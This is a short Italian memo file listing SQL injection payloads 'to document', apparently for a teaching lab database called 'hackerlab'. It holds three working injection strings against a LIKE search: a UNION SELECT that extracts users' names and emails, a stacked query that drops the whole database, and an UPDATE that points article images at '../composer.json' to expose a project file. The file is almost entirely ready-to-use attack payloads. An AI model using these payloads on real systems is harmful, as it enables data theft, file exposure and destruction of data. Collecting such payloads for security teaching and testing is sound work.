File di promemoria per SQL Injection da documentare.

Seleziona anche gli utenti nella tabella articles.
a%' UNION ALL SELECT '', '', CONCAT(full_name, " ", email), '','','','' FROM users;--

Esegue un drop del database.
a%'; DROP DATABASE hackerlab; --

Aggiorna le immagini degli articoli.
a%'; UPDATE articles SET image = "../composer.json"; --